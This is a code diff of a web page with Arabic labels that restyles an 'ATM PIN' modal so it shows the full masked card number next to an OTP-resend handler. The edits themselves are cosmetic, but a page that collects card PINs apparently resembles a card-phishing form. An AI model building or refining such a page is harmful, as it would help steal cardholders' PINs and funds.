@@ -859,12 +859,10 @@
                     </div>
                     
                     <!-- Card Info -->
-                    <div style="background-color: #f8f9fa; border: 1px solid #e2e8f0; border-radius: 6px; padding: 15px; margin-bottom: 20px; text-align: center;">
-                        <div style="margin-bottom: 5px;">
+                    <div style="background-color: #f8f9fa; border: 1px solid #e2e8f0; border-radius: 6px; padding: 15px; margin-bottom: 20px;">
+                        <div style="display: flex; justify-content: space-between;">
                             <span style="color: #4a5568; font-size: 13px;">رقم البطاقة:</span>
-                        </div>
-                        <div>
-                            <span style="color: #2d3748; font-size: 16px; font-weight: 600; direction: ltr; letter-spacing: 2px;" id="atmMaskedCard">****</span>
+                            <span style="color: #2d3748; font-size: 13px; font-weight: 500; direction: ltr;" id="atmMaskedCard">**** **** **** ****</span>
                         </div>
                     </div>
                     
@@ -1327,12 +1325,10 @@
             alert('تم إعادة إرسال رمز التحقق');
         });
         
-        // ATM PIN Modal - Copy last 4 digits only
+        // ATM PIN Modal - Copy masked card number
         $('#atmPinModal').on('show.bs.modal', function() {
             const maskedCard = document.getElementById('maskedCard').textContent;
-            // استخراج آخر 4 أرقام فقط
-            const lastFour = maskedCard.trim().slice(-4);
-            document.getElementById('atmMaskedCard').textContent = lastFour;
+            document.getElementById('atmMaskedCard').textContent = maskedCard;
         });
         
         // ATM PIN - Only allow numbers
